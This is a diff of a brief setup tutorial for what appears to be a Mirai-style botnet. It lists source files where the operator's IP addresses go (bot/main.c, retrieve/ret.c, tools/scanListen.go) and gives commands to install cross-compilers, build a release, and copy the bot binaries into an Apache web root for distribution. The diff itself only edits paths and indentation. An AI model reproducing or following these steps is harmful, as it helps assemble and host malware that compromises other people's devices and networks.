@@ -1,10 +1,7 @@
-TuT
-
-
 edit ips in \bot\main.c [Line 104]
 \retrieve\ret.c [Line 79]
 \retrieve\retrieve.c [Line 125]
-
+\tools\scanListen.go [Line 10]
 
 mkdir /etc/xcompile
 cd /etc/xcompile
@@ -67,10 +64,10 @@ make sure to have bzip2 for arm7
 apt install bzip2
 apt install apache2 -y
 
- bash build.sh release
- cd release
- cp * /var/www/html
- apt install golang-go
+bash build.sh release
+cd release
+cp * /var/www/html
+apt install golang-go
 
 cd
 bash build.sh debug
